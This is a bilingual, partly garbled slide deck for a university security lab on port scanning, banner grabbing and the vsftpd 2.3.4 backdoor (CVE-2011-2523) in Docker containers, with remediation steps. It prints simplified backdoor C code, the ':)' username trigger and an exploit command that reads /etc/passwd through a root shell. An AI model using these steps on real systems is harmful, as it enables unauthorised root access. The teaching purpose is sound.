# SEMINAR 13 - Securitya in Networksle of Calculatoare
## Scanning of Ports and Testinga Vulnerabilities Simple

**Total duration**: 120 minute (2 ore)
**Activity type**: Assisted code development + Assisted use of security tools
**Requirements**: Python 3.8+, Docker, acces terminal, root privileges/sudo

---

## STRUCTURA LABORATORULUI

```
┌─────────────────────────────────────────────────────────────────────┐
│  FAZA 1: Setup & Recunoastere (25 min)                              │
├─────────────────────────────────────────────────────────────────────┤
│  FAZA 2: Scanning Active (35 min)                                    │
├─────────────────────────────────────────────────────────────────────┤
│  FAZA 3: Analiza Vulnerabilities (35 min)                        │
├─────────────────────────────────────────────────────────────────────┤
│  FAZA 4: Demonstration Exploit & Remediation (20 min)                  │
├─────────────────────────────────────────────────────────────────────┤
│  FAZA 5: Wrap-up & Evaluation (5 min)                                 │
└─────────────────────────────────────────────────────────────────────┘
```

---

## SLIDE 1: Titlu

**SEMINAR 13**
# Securitya in Networksle of Calculatoare

### Scanning of Ports and Testinga Vulnerabilities Simple

**Lecture**: Computer Networks
**Academic Year**: 2025-2026
**Semester**: 2

*ASE Bucharest - Facultatea CSIE*

---

## SLIDE 2: Operational Objectives

At the end of this lab, you will be able to:

1. **Configure** un testing environment izolat with Docker
2. **Implement** un port scanner TCP in Python
3. **Identify** vulnerable services through banner grabbing
4. **Analyse** trafficul of network with Wireshark/tcpdump
5. **Demonstrati** exploatarea unei vulnerabilities cunoscute (CVE)
6. **Apply** masuri of remediation and hardening

**Evaluation**: File REZULTATE_S13.txt with output-uri, screenshots, answers

---

## SLIDE 3: Agenda Detaliata

| Hour | Activeity | Metoda |
|-----|-----------|--------|
| 0:00-0:10 | Environment setup Docker | Command ghidata |
| 0:10-0:25 | Recunoastere pasiva | Note + discutie |
| 0:25-0:45 | Scanner ports - dezvoltare | Cod asistat |
| 0:45-0:60 | Banner grabbing | Cod asistat |
| 0:60-0:75 | Vulnerability checker | Cod + analysis |
| 0:75-0:95 | Demonstration exploit CVE | Note + discutie |
| 0:95-1:10 | Remediation and hardening | Configuration asistata |
| 1:10-1:20 | Finalisation & upload | Individual |

---

## SLIDE 4: Topologia Laboratorului

```
                    ┌─────────────────────┐
                    │   ATTACKER HOST     │
                    │   (Masina voastra)  │
                    │   172.20.0.1        │
                    └─────────┬───────────┘
                              │
              ┌───────────────┴───────────────┐
              │     DOCKER NETWORK            │
              │     pentestnet                │
              │     172.20.0.0/24             │
              └───────────────────────────────┘
                    │         │         │
         ┌──────────┴──┐ ┌────┴────┐ ┌──┴──────────┐
         │   DVWA      │ │ WebGoat │ │   vsftpd    │
         │ 172.20.0.10 │ │  .0.11  │ │   .0.12     │
         │ :8888 (HTTP)│ │ :8080   │ │ :2121 (FTP) │
         │ SQLi, XSS   │ │ OWASP   │ │ CVE-2011-   │
         │             │ │ lessons │ │    2523     │
         └─────────────┘ └─────────┘ └─────────────┘
```

**Note**: All servicesle are *intentionat vulnerabile* - only for environment izolat!

---

## SLIDE 5: Faza 1 - Preparationa Mediului

### Steps of Setup (Terminal)

```bash
# 1. Navigare in directorul starterkit
cd starterkit_s13

# 2. Install Python dependencies
make setup

# 3. Start infrastructura Docker
make docker-up

# 4. Verification services activee
docker ps --format "table {{.Names}}\t{{.Ports}}\t{{.Status}}"
```

### Output Expected

```
NAMES         PORTS                    STATUS
dvwa          0.0.0.0:8888->80/tcp     Up 30 seconds (healthy)
webgoat       0.0.0.0:8080->8080/tcp   Up 30 seconds
vsftpd        0.0.0.0:2121->21/tcp     Up 30 seconds
              0.0.0.0:6200->6200/tcp
```

**Checkpoint**: Confirmati ca vedeti 3 containere with status "Up"

---

## SLIDE 6: Verification Acces Services

### Test browser (DVWA)

1. Deschideti: `http://localhost:8888`
2. Login: `admin` / `password`
3. Click: "Create / Reset Database"
4. Setati: DVWA Security → **Low**

### Test browser (WebGoat)

1. Deschideti: `http://localhost:8080/WebGoat`
2. Register user nou or login existent

### Test terminal (FTP)

```bash
# Test conectivitate FTP
nc -vz localhost 2121
# Output expected: Connection to localhost 2121 port [tcp/*] succeeded!
```

---

## SLIDE 7: Faza 2 - Concepte: Scanning Ports

### What is scanninga of ports?

**Definition**: Procesul sistematic of interogare a portslor TCP/UDP for a determina starea lor (open/closed/filtered).

### Tipuri of scanari

| Type | Metoda | Detectabilitate | Viteza |
|-----|--------|-----------------|--------|
| **TCP Connect** | Handshake complete | Ridicata | Medie |
| **SYN Scan** | Half-open (SYN→SYN-ACK) | Medie | Rapida |
| **UDP Scan** | Datagrama + ICMP | Scazuta | Lenta |
| **ACK Scan** | Detection firewall | Medie | Rapida |

**Azi vom implementa**: TCP Connect Scan (not necesita privilegii root)

---

## SLIDE 8: Exercitiu 1 - Port Scanner (Part 1)

### Deschideti fisierul: `python/exercises/ex_01_port_scanner.py`

```python
# Sectiunea STUDENT - Completati functia of scanning
def scan_port(target: str, port: int, timeout: float = 1.0) -> PortResult:
    """
    Scan un singur port TCP.
    
    Algoritmul:
    1. Create socket TCP
    2. Set timeout
    3. Try connect_ex() - return 0 if portul e open
    4. Inchide socket-ul
    
    Returns:
        PortResult with state='open'/'closed'/'filtered'
    """
    # TODO: Implement conform algoritmului of more sus
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    
    result = sock.connect_ex((target, port))
    sock.close()
    
    if result == 0:
        return PortResult(port=port, state='open')
    elif result == errno.ECONNREFUSED:
        return PortResult(port=port, state='closed')
    else:
        return PortResult(port=port, state='filtered')
```

---

## SLIDE 9: Exercitiu 1 - Port Scanner (Part 2)

### Run scanner-ul

```bash
# Scanning target principal - ports comune
make scan TARGET=172.20.0.10

# Or direct with Python
python python/exercises/ex_01_port_scanner.py 172.20.0.10 -p 1-1024

# Scanning rapida only ports web
python python/exercises/ex_01_port_scanner.py 172.20.0.10 -p 80,443,8080,8888
```

### Analyse output-ul

```
[*] Scanning 172.20.0.10 (1024 ports)
[+] 172.20.0.10:80   OPEN   (http)
[+] 172.20.0.10:443  OPEN   (https)

Scan completed in 12.34s
Open ports: 2 | Closed: 1022 | Filtered: 0
```

**Intrebare for studenti**: Of what unele ports apar ca "filtered"?

---

## SLIDE 10: Banner Grabbing - Teorie

### What is Banner Grabbing?

**Definition**: Tehnica of extragere a informationlor about servicel which running on un port, through citirea messageului of bun venit (banner).

### Information extrase tipic

- **Numele servicelui** (Apache, nginx, vsftpd)
- **Versiunea** software-ului
- **Sistemul of operare** (uneori)
- **Configurations** neobisnuite

### Of what e important?

```
vsftpd 2.3.4    →  CVE-2011-2523 (backdoor!)
OpenSSH 7.4     →  Verification if e patch-uit
Apache 2.4.49   →  CVE-2021-41773 (path traversal)
```

---

## SLIDE 11: Exercitiu 2 - Banner Grabbing

### Run banner grabber-ul

```bash
# Extrage banner FTP
python python/exploits/banner_grabber.py 172.20.0.12 -p 2121

# Output expected:
# [+] 172.20.0.12:2121
#     Banner: 220 (vsFTPd 2.3.4)
#     Protocol: FTP
#     Version: 2.3.4
```

### Interpretare

| Banner | Semnificatie | Risc |
|--------|--------------|------|
| `vsFTPd 2.3.4` | Version vulnerabila | **CRITIC** |
| `Apache/2.4.41` | Server web standard | Environment |
| `OpenSSH_8.4p1` | SSH updated | Scazut |

**Noteti in REZULTATE_S13.txt**: What version vsftpd ati detectat?

---

## SLIDE 12: Faza 3 - Vulnerability Checking

### Run vulnerability checker

```bash
# Verification automata vulnerabilities
python python/exercises/ex_04_vuln_checker.py 172.20.0.12 \
    --service ftp \
    --port 2121
```

### Output tipic

```json
{
  "target": "172.20.0.12",
  "port": 2121,
  "service": "ftp",
  "vulnerabilities": [
    {
      "cve": "CVE-2011-2523",
      "name": "vsftpd 2.3.4 Backdoor",
      "severity": "CRITICAL",
      "cvss": 10.0,
      "description": "Backdoor in vsftpd allow executie cod arbitrar"
    }
  ],
  "checks_passed": ["banner_extracted"],
  "checks_failed": ["version_outdated", "backdoor_vulnerable"]
}
```

---

## SLIDE 13: Analiza CVE-2011-2523

### Cronologie

```
Iunie 2011     Attacker unknown modify codul sursa vsftpd
│
▼
30 Iunie 2011  Versiunea 2.3.4 publicata on vsftpd.beasts.org
│              (contains backdoor-ul)
▼
3 Iulie 2011   Backdoor descoperit, versiunea retrasa
│
▼
4 Iulie 2011   CVE-2011-2523 atribuit, patch disponibil
```

### Mecanismul backdoor-ului

1. Attackatorul send username with sufixul `:)` (smiley)
2. Codul check prezenta "smiley-ului" in username
3. If exista → deschide port 6200 with shell root
4. Attackatorul se connect at portul 6200 → full access

---

## SLIDE 14: Anatomia Backdoor-ului

### Codul malitios (simplificat)

```c
// In str.c - functia vsf_sysutil_check_password()
if (strstr(p_user, ":)") != NULL) {
    // Backdoor trigger!
    int fd = socket(...);
    bind(fd, port 6200);
    listen(fd, ...);
    // Fork shell for connections noi
    if (fork() == 0) {
        execl("/bin/sh", "sh", NULL);
    }
}
```

### Of what a fost greu of detectat?

1. **Cod minimum** - only cateva linii
2. **Ascuns in function legitima** - verification password
3. **Trigger obscur** - cine check username for `:)`?
4. **Without loguri** - not lasa urme in log-uri

---

## SLIDE 15: Faza 4 - Demonstration Exploit

### ⚠ WARNING: Only in environment controlat!

```bash
# Demonstration exploit (ONLY note!)
python python/exploits/ftp_backdoor_vsftpd.py 172.20.0.12 \
    --port 2121 \
    --command "id; hostname; cat /etc/passwd | head -5"
```

### Output (demonstration)

```
[*] Connecting to 172.20.0.12:2121...
[+] Banner: 220 (vsFTPd 2.3.4)
[*] Sending backdoor trigger (USER test:))...
[*] Waiting for backdoor port 6200...
[+] Backdoor port open! Connecting...
[+] Shell obtained!

uid=0(root) gid=0(root) groups=0(root)
vsftpd-container
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

**Intrebare etica**: What ar face un attacker with this acces?

---

## SLIDE 16: Captura Trafficului

### Start capture Wireshark/tcpdump

```bash
# Terminal 1: Start captura
make capture-start IF=docker0

# Terminal 2: Running exploit-ul
python python/exploits/ftp_backdoor_vsftpd.py 172.20.0.12 ...

# Terminal 1: Stop captura
make capture-stop
```

### Analysis in Wireshark

1. Deschideti `captures/capture_*.pcap`
2. Filtru: `ftp || tcp.port == 6200`
3. Identify:
   - Packetele FTP with "USER test:)"
   - Connection noua on portul 6200
   - Commandsle executate in shell

**Noteti in REZULTATE_S13.txt**: Screenshot with packets relevante

---

## SLIDE 17: Masuri of Remediation

### Nivel 1: Patch imediat

```bash
# Update at version sigura
apt-get update && apt-get install vsftpd  # Ultima version from repo

# Or installation from sursa (versiunea curenta e sigura)
wget https://security.appspot.com/downloads/vsftpd-3.0.5.tar.gz
```

### Nivel 2: Configuration defensiva

```bash
# /etc/vsftpd.conf
anonymous_enable=NO
local_enable=YES
write_enable=NO
chroot_local_user=YES
allow_writeable_chroot=NO
pasv_enable=NO
```

### Nivel 3: Firewall and segmentare

```bash
# iptables - restrictionare acces FTP
iptables -A INPUT -p tcp --dport 21 -s 10.0.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 21 -j DROP
```

---

## SLIDE 18: Defense in Depth

```
┌─────────────────────────────────────────────────────────────────┐
│                    STRATIFICARE SECURITATE                       │
├─────────────────────────────────────────────────────────────────┤
│  Layer 1: PERIMETRU                                              │
│  ├── Firewall (iptables, pf)                                    │
│  ├── IDS/IPS (Snort, Suricata)                                  │
│  └── WAF (ModSecurity)                                          │
├─────────────────────────────────────────────────────────────────┤
│  Layer 2: RETEA                                                  │
│  ├── Segmentare VLAN                                            │
│  ├── Network ACL                                                │
│  └── TLS for comunicatii                                     │
├─────────────────────────────────────────────────────────────────┤
│  Layer 3: HOST                                                   │
│  ├── Patching regulat                                           │
│  ├── Minimal privileges (least privilege)                       │
│  └── Logging and monitoring                                    │
├─────────────────────────────────────────────────────────────────┤
│  Layer 4: APLICATIE                                              │
│  ├── Input validation                                           │
│  ├── Authentication puternica                                    │
│  └── Cod review and audit                                        │
└─────────────────────────────────────────────────────────────────┘
```

---

## SLIDE 19: Exercitiu - Implementation Masuri

### Configure TLS for MQTT

```bash
# 1. Generati certificateses (deja facut at setup)
make setup

# 2. Verificati diferenta between connection plain and TLS
# Plain (nesigur):
python python/exercises/ex_02_mqtt_client.py \
    --broker 172.20.0.100 --port 1883 --mode sensor

# TLS (sigur):
python python/exercises/ex_02_mqtt_client.py \
    --broker 172.20.0.100 --port 8883 --tls \
    --ca-cert configs/certs/ca.crt --mode sensor
```

### Observati in Wireshark

- **Port 1883**: Payload vizibil in plaintext
- **Port 8883**: Payload encrypted, handshake TLS vizibil

---

## SLIDE 20: Faza 5 - Finalisation

### Content REZULTATE_S13.txt

```markdown
# Results Seminar 13 - Security Networks

## Information student
- Nume: [Numele vostru]
- Grupa: [Grupa]
- Data: [Data laboratorului]

## Exercise 1: Port Scanning
- Ports opene gasite on 172.20.0.10: [lista]
- Ports opene gasite on 172.20.0.12: [lista]
- Time total scanning: [X secunde]

## Exercise 2: Banner Grabbing
- Version vsftpd detectata: [versiunea]
- Is vulnerabil CVE-2011-2523? [Yes/Not]

## Exercise 3: Capture traffic
[Atasati screenshot Wireshark with packetele FTP]

## Intrebari of reflectie
1. Of what vsftpd 2.3.4 is periculos?
   [Responseul vostru]

2. Numiti 3 masuri for prevenirea acestui type of attack:
   - [Masura 1]
   - [Masura 2]
   - [Masura 3]

3. What diferenta observati between trafficul MQTT plain vs TLS?
   [Responseul vostru]
```

---

## SLIDE 21: Cleanup and Upload

### Commands of finalisation

```bash
# Stop infrastructura
make docker-down

# Cleanup complete
make clean-all

# Verification ca not au ramas containere
docker ps -a
```

### Submisie

1. Salvati fisierul `REZULTATE_S13.txt`
2. Includeti screenshots (Wireshark, terminale)
3. Incarcati on platforma of evaluare

---

## SLIDE 22: Resurse Suplimentare

### Documentatie oficiala

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [CVE Database](https://cve.mitre.org/)

### Platforme of practica (legale)

- [Hack The Box](https://www.hackthebox.eu/) - CTF and masini vulnerabile
- [TryHackMe](https://tryhackme.com/) - Lectureuri ghidate
- [VulnHub](https://www.vulnhub.com/) - VM-uri vulnerabile descarcabile

### Certificari relevante

- **CompTIA Security+** - Fundamente security
- **CEH** - Certified Ethical Hacker
- **OSCP** - Offensive Security Certified Professional

---

## SLIDE 23: Q&A

### Intrebari frecvente

**Q: E legal sa scanez networks?**
A: Only with acordul explicit al proprietarului. Scanninga neauthoriseda = infractiune.

**Q: How ma protejez ca dezvoltator?**
A: Verificati dependentele (npm audit, pip-audit), patch-uri regulate, code review.

**Q: Which e diferenta dintre pentest and hacking?**
A: Pentesting = authorised, documented, etic. Hacking neauthorised = ilegal.

---

## ANEXA: Cheat Sheet Commands

```bash
# === SETUP ===
make setup                    # Install dependencies
make docker-up               # Start containere

# === SCANARE ===
make scan TARGET=IP          # Port scan
make scan TARGET=IP PORTS=1-1024  # With range specific

# === MQTT ===
make mqtt-pub TOPIC=test MSG="hello"  # Publish
make mqtt-sub TOPIC=test             # Subscribe

# === CAPTURA ===
make capture-start IF=docker0   # Start tcpdump
make capture-stop              # Stop and save

# === EXPLOIT (only demo) ===
make exploit-ftp TARGET=172.20.0.12

# === CLEANUP ===
make docker-down             # Stop containere
make clean-all               # Cleanup complete
```

---

## ANEXA: Troubleshooting

| Problema | Cauza | Solution |
|----------|-------|---------|
| "Connection refused" | Service nefunctional | `docker-compose restart` |
| "Allowedsion denied" | Lipsa drepturi | `sudo make ...` or add user at grup docker |
| "Modules not found" | Dependencies lipsa | `make setup` |
| Wireshark not vede traffic | Interface gresita | Select `docker0` or `any` |
| Exploit timeout | Firewall/version | Check ca e vsftpd 2.3.4 |

---

*Document generated for Seminar 13 - Computer Networks*
*ASE Bucharest, CSIE, 2025-2026*
